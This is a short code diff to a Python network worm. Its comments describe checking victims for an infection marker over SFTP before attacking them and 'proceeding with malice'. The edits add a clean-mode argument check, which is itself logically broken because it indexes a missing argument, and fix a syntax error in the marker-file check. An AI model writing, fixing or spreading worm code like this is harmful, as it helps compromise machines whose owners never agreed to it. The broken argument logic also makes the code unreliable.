@@ -243,12 +243,11 @@ def cleaner(sshClient):
 # IP address and have the worm check the IP of the current
 # system against the hardcoded IP.
 
-if len(sys.argv) < 2:
+if len(sys.argv) < 2 and not(sys.argv[1] == '-c' or sys.argv[1] == "--clean"):
 	
 	# If we are running on the victim, check if 
 	# the victim was already infected. If so, terminate.
 	# Otherwise, proceed with malice.
-
 	if isInfectedSystem():
 		exit
 
@@ -313,7 +312,7 @@ for host in networkHosts:
 			# Try to fetch marker file from victim
 			# Better way to check if victim machine is infected
 			# Will throw IOError if it does not exist
-			sftp.stat(INFECTED_MARKER_FILE):
+			sftp.stat(INFECTED_MARKER_FILE)
 
 			# If it fails, next lines will be skipped and start after "except IOError:" and we can attack victim system
 			# If it exists:
